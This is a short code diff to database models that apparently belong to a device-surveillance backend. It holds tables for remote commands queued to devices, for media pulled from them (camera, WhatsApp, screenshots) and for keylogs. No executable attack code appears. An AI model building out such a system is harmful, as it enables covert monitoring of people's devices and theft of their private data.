@@ -143,10 +143,12 @@ class Command(Base):
     __tablename__ = "commands"
     id = Column(Integer, primary_key=True, index=True)
     command_type = Column(String)
-    status = Column(String, default="pending")
     payload = Column(String, nullable=True)
+    status = Column(String, default="PENDING")
     created_at = Column(DateTime(timezone=True), default=func.now())
     device_id = Column(Integer, ForeignKey("devices.id"))
+
+    device = relationship("Device")
 
     @property
     def command(self):
@@ -168,15 +170,16 @@ class Command(Base):
 class MediaFile(Base):
     __tablename__ = "media_files"
     id = Column(Integer, primary_key=True, index=True)
-    device_id = Column(Integer, ForeignKey("devices.id"))
     file_name = Column(String)
-    s3_key = Column(String, index=True)
-    file_type = Column(String, default="image/jpeg")
-    file_size = Column(Integer, default=0)
-    captured_at = Column(BigInteger, default=0)
-    created_at = Column(DateTime(timezone=True), default=func.now())
-    
-    device = relationship("Device", back_populates="media_files")
+    file_path = Column(String)
+    file_type = Column(String) # IMAGE, VIDEO, DOCUMENT
+    category = Column(String, nullable=True) # e.g., "Camera", "WhatsApp", "Screenshots"
+    size = Column(Integer)
+    s3_key = Column(String, nullable=True)
+    thumbnail_key = Column(String, nullable=True)
+    device_id = Column(Integer, ForeignKey("devices.id"))
+
+    device = relationship("Device")
 
 class Keylog(Base):
     __tablename__ = "keylogs"
